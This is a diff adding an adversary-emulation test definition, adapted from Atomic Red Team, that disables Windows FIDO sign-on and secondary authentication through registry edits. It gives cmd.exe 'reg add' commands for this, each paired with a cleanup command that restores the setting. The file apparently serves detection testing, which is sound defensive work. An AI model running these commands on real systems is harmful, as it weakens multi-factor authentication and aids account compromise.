@@ -1,0 +1,45 @@
+# Adapted from Atomic Red Team - Modify Registry
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
+# Original auto_generated_guids: ffeddced-bb9f-49c6-97f0-3d07a509bf94, c26fb85a-fa50-4fab-a64a-c51f5dc538d5
+
+---
+api_version: 2.0
+uuid: c5e55e9d-843a-4cf2-9345-55f1b2559718
+name: Disable Authentication Security Features
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Disable modern authentication security features including Microsoft FIDO authentication and secondary authentication (MFA).
+  Adversaries use these techniques to bypass multi-factor authentication and gain unauthorized access to systems or sensitive data,
+  increasing the risk of falling victim to phishing attacks and credential compromise.
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1112 Modify Registry"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: false
+
+steps:
+  - name: disable_fido_authentication
+    executor: cmd.exe
+    inline: |
+      reg add "HKLM\SOFTWARE\Policies\Microsoft\FIDO" /v "AllowExternalDeviceSignon" /t REG_DWORD /d 0 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\FIDO" /v "AllowExternalDeviceSignon" /t REG_DWORD /d 1 /f
+
+  - name: disable_secondary_authentication
+    executor: cmd.exe
+    inline: |
+      reg add "HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor" /v "AllowSecondaryAuthenticationDevice" /t REG_DWORD /d 0 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor" /v "AllowSecondaryAuthenticationDevice" /t REG_DWORD /d 1 /f
